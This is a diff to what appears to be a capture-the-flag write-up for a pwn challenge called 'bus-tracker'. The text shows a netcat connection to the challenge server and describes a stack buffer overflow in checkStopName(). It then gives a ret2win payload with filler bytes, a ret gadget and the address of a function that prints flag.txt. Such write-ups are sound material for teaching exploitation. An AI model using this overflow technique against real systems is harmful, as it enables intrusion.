@@ -2,22 +2,18 @@
 
 `nc bus-tracker.wolvctf-2026.kctf.cloud 1337`
 
-## Protections
-
-Static binary, canary present but unused in the vulnerable function, NX disabled, no PIE.
-
 ## Bug
 
-`checkStopName()` reads `0x100` bytes into a 64-byte buffer at `rbp-0x40`. Offset to RIP: `0x48`.
-
-`dispatcherOverride()` at `0x4017e5` opens `flag.txt` and prints it. It takes no arguments.
+`checkStopName()` reads `0x100` bytes into a 64-byte stack buffer. The extra bytes overwrite the saved return address, so we control the next instruction.
 
 ## Exploit
+
+Send 0x40 filler bytes, 8 bytes for saved RBP, then a `ret` gadget for stack alignment, then `dispatcherOverride`. That function opens `flag.txt` and prints it. It takes no arguments, so no register setup is needed.
 
 ```text
 'A' * 0x40
 'B' * 8
-0x4018b3   ret (stack alignment)
+0x4018b3   ret
 0x4017e5   dispatcherOverride
 ```
 
